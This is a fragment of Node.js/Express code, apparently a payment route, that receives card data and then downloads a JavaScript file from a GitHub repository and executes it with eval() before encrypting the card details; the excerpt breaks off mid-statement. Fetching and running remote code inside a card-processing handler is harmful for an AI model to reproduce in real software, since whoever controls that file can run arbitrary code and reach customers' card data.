...
app.post('/oceanPaymentEncrypt', async function (req, res) {
  try {
    const data = req.body;
    const card = data.card;
    ...
    const response = await fetch('https://raw.githubusercontent.com/SleeplessEmpress/misakaRepository/main/ocean_payment.js');
    const oceanPaymentEncrypt = await response.text();
    eval(oceanPaymentEncrypt);

    const card_dataEncrypt = createEncryption(hexEncryptionKey);

    const card_data = card_dataEncrypt.encrypt({
